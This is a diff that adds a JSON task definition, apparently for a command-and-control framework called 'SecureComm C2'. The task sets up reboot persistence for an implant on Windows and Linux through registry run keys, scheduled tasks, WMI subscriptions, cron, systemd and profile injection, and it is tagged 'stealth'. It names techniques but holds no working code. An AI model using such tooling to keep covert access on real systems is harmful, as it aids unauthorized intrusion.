@@ -1,0 +1,37 @@
+{
+  "id": "persistence_setup",
+  "name": "Establish Persistence",
+  "description": "Configure agent to survive reboots using various persistence mechanisms",
+  "version": "1.0",
+  "author": "SecureComm C2",
+  "category": "persistence",
+  "platform": "cross-platform",
+  "risk_level": "high",
+  "requires_admin": true,
+  "commands": [
+    {
+      "type": "persist",
+      "payload": "registry",
+      "alt_payload": "cron",
+      "description": "Install persistence mechanism",
+      "timeout": 120
+    }
+  ],
+  "persistence_methods": {
+    "windows": [
+      "registry_run_key",
+      "scheduled_task",
+      "wmi_event_subscription",
+      "service_install"
+    ],
+    "linux": [
+      "cron_job",
+      "systemd_service",
+      "init_script",
+      "profile_injection"
+    ]
+  },
+  "tags": ["persistence", "survival", "stealth"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z"
+}
